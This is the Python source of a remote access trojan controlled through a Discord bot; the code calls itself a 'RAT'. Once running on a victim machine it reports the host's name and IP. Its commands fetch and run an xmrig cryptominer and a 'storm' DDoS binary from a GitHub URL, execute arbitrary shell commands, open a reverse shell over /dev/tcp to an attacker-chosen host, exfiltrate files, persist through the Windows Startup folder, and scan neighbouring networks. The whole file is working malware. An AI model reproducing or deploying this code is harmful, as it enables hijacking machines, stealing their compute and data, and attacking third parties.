from discord.ext import commands
import requests, platform, discord, urllib, psutil, socket, sys, os

token = 'MToken.mnt.discord' # Token
channel_id = 111111111111111111  # Channel ID

# bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')

# client
ip = requests.get("https://sheesh.rip/ip").headers['IP']
hostname = socket.gethostname()
if platform.system() == 'Linux':
    os.chdir("/tmp")
else:
    appdata = os.getenv("AppData")
    startup = f"{appdata}\Microsoft\Windows\Start Menu\Programs\Startup"
    temp = os.getenv("temp")
    os.chdir(temp)

# login
@bot.event
async def on_ready():
    channel = bot.get_channel(channel_id)
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ip))
    print(f"{bot.user}")
    await channel.send(f"``[+] {hostname}@{ip}: Session opened``")
    

# ----- Bot Commands ----- #

# sessions
@bot.command()
async def sessions(ctx):
    await ctx.send(f"``[*] {hostname}@{ip}``")
    
# check
@bot.command()
async def check(ctx):
    if platform.system() == 'Linux':
        if "xmrig" in (i.name() for i in psutil.process_iter()):
            await ctx.send(f"``[+] {hostname}@{ip}: Miner running``")
            
        if "storm" in (i.name() for i in psutil.process_iter()):
            await ctx.send(f"``[+] {hostname}@{ip}: DDoS running``")
            
        if "zmap" in (i.name() for i in psutil.process_iter()):
            await ctx.send(f"``[+] {hostname}@{ip}: ZMap running``")
            
        if "nmap" in (i.name() for i in psutil.process_iter()):
            await ctx.send(f"``[+] {hostname}@{ip}: Nmap running``")
    else:
        if "xmrig.exe" in (i.name() for i in psutil.process_iter()):
            await ctx.send(f"``[+] {hostname}@{ip}: Miner running``")
    
# update linux
@bot.command()
async def updatelinux(ctx, shUpdateLinkArg):
    sh_update_link = ''.join(shUpdateLinkArg)
    if platform.system() == 'Linux':
        os.chdir("/boot")
        if os.path.exists("Client"):
            os.remove("Client")
            
        r = requests.get(shUpdateLinkArg, allow_redirects=True)
        open("Client", 'wb').write(r.content)
            
        if os.path.exists("Client"):
            os.popen("chmod 777 Client; ./Client")
            await ctx.send(f"``[+] {hostname}@{ip}: RAT updated``")
            sys.exit()
        else:
            await ctx.send(f"``[-] {hostname}@{ip}: RAT not updated``")
            os.chdir("/tmp")
    
# update windows
@bot.command()
async def updatewin(ctx, winUpdateLinkArg):
    win_update_link = ''.join(winUpdateLinkArg)
    if platform.system() == 'Windows':
        os.chdir(startup)
        if os.path.exists("Client.exe"):
            os.remove("Client.exe")
            
        r = requests.get(winUpdateLinkArg, allow_redirects=True)
        open("Client.exe", 'wb').write(r.content)
            
        if os.path.exists("Client.exe"):
            os.popen("Client.exe")
            await ctx.send(f"``[+] {hostname}@{ip}: RAT updated``")
            sys.exit()
        else:
            await ctx.send(f"``[-] {hostname}@{ip}: RAT not updated``")
            os.chdir(temp)
    
# ddos
@bot.command()
async def ddos(ctx, ddosArg):
    ddosip = ''.join(ddosArg)
    if platform.system() == 'Linux':
        if not os.path.exists("storm"):
            url = "https://github.com/rxu7s/Public/raw/main/storm"
            r = requests.get(url, allow_redirects=True)
            open("storm", 'wb').write(r.content)
            
        os.popen(f"chmod 777 storm; ./storm -d {ddosip}")
        await ctx.send(f"``[+] {hostname}@{ip}: DDoS started``")
    else:
        await ctx.send(f"``[-] {hostname}@{ip}: OS not supported``")
    
# stop ddos
@bot.command()
async def stopddos(ctx):
    if platform.system() == 'Linux':
        if "storm" in (i.name() for i in psutil.process_iter()):
            os.popen("pkill storm")
            await ctx.send(f"``[-] {hostname}@{ip}: DDoS stoped``")
    
# miner
@bot.command()
async def miner(ctx, walletArg):
    wallet = ''.join(walletArg)
    if platform.system() == 'Linux':
        if not os.path.exists("xmrig"):
            url = "https://github.com/rxu7s/Public/raw/main/xmrig"
            r = requests.get(url, allow_redirects=True)
            open("xmrig", 'wb').write(r.content)
            
        os.popen(f"chmod 777 xmrig; ./xmrig --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Linux -k --tls")
        await ctx.send(f"``[+] {hostname}@{ip}: Miner started``")
    else:
        if not os.path.exists("xmrig.exe"):
            url = "https://github.com/rxu7s/Public/raw/main/xmrig.exe"
            r = requests.get(url, allow_redirects=True)
            open("xmrig.exe", 'wb').write(r.content)
            
        os.popen(f"xmrig.exe --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Windows -k --tls")
        await ctx.send(f"``[+] {hostname}@{ip}: Miner started``")
    
# stop miner
@bot.command()
async def stopminer(ctx):
    if platform.system() == 'Linux':
        if "xmrig" in (i.name() for i in psutil.process_iter()):
            os.popen("pkill xmrig")
            await ctx.send(f"``[-] {hostname}@{ip}: Miner stoped``")
    else:
        if "xmrig.exe" in (i.name() for i in psutil.process_iter()):
            os.popen("taskkill /F /IM xmrig.exe /T")
            await ctx.send(f"``[-] {hostname}@{ip}: Miner stoped``")
    
# zmap
@bot.command()
async def zmap(ctx):
    if platform.system() == 'Linux':
        os.popen("apt-get install zmap -y")
        p = os.popen(f"zmap -B 10M -p 22 {ip}/24 -o {ip}-list.txt")
        await ctx.send(f"``[+] {hostname}@{ip}: ZMap started``")
            
        if "zmapscan" not in p.read():
            if os.path.exists(f"{ip}-list.txt"):
                await ctx.send(f"``[+] {hostname}@{ip}: ZMap report``",file=discord.File(f"{ip}-list.txt"))
    else:
        await ctx.send(f"``[-] {hostname}@{ip}: OS not supported``")
    

# ----- Self Commands ----- #

# info
@bot.command(name=f"info.{hostname}@{ip}")
async def ipinfo(ctx):
    link = "https://sheesh.rip/ip"
    f = requests.get(link)
    await ctx.send(f"""
    ``[+] {hostname}@{ip}: IP Information``\n```json\nIP:{f.headers['IP']}\nASN:{f.headers['ASN']}\nCountry:{f.headers['Country']}\nCity:{f.headers['City']}```
    """)
    
# shell
@bot.command(name=f"shell.{hostname}@{ip}")
async def shell(ctx, *args):
    arguments = ' '.join(args)
    stream = os.popen(arguments)
    output = stream.read()
        
    if sys.getsizeof(output) > 2000:
        await ctx.send(f"``[+] {hostname}@{ip}: Command executed``")
    else:
        await ctx.send(f"``[+] {hostname}@{ip}: Command executed`` ```sh\n{output}```")
    
# reverse shell
@bot.command(name=f"revshell.{hostname}@{ip}")
async def revshell(ctx, revshellRipArg, revshellRportArg):
    rip = ''.join(revshellRipArg)
    rport = ''.join(revshellRportArg)
    if platform.system() == 'Linux':
        os.popen(f"cmd -i >& /dev/tcp/{rip}/{rport} 0>&1")
    else:
        await ctx.send(f"``[-] {hostname}@{ip}: OS not supported``")
    
# download
@bot.command(name=f"download.{hostname}@{ip}")
async def download(ctx, downloadLinkArg, downloadNameArg):
    link = ''.join(downloadLinkArg)
    name = ''.join(downloadNameArg)
        
    url = link
    r = requests.get(url, allow_redirects=True)
    open(name, 'wb').write(r.content)
        
    if os.path.exists(name):
        await ctx.send(f"``[+] {hostname}@{ip}: File downloaded``")
    else:
        await ctx.send(f"``[-] {hostname}@{ip}: File not downloaded``")
    
# upload
@bot.command(name=f"upload.{hostname}@{ip}")
async def upload(ctx, uploadPathArg):
    path = ''.join(uploadPathArg)
    await ctx.send(f"``[+] {hostname}@{ip}: File uploaded``",file=discord.File(path))
    
# nmap
@bot.command(name=f"nmap.{hostname}@{ip}")
async def nmap(ctx):
    if platform.system() == 'Linux':
        os.popen("apt-get install nmap -y")
        p = os.popen(f"nmap --script vuln {ip} -oG {ip}-scan.txt")
        await ctx.send(f"``[+] {hostname}@{ip}: Nmap started``")
            
        if "nmapscan" not in p.read():
            if os.path.exists(f"{ip}-scan.txt"):
                await ctx.send(f"``[+] {hostname}@{ip}: Nmap report``",file=discord.File(f"{ip}-scan.txt"))
    else:
        await ctx.send(f"``[-] {hostname}@{ip}: OS not supported``")
    

    

bot.run(token)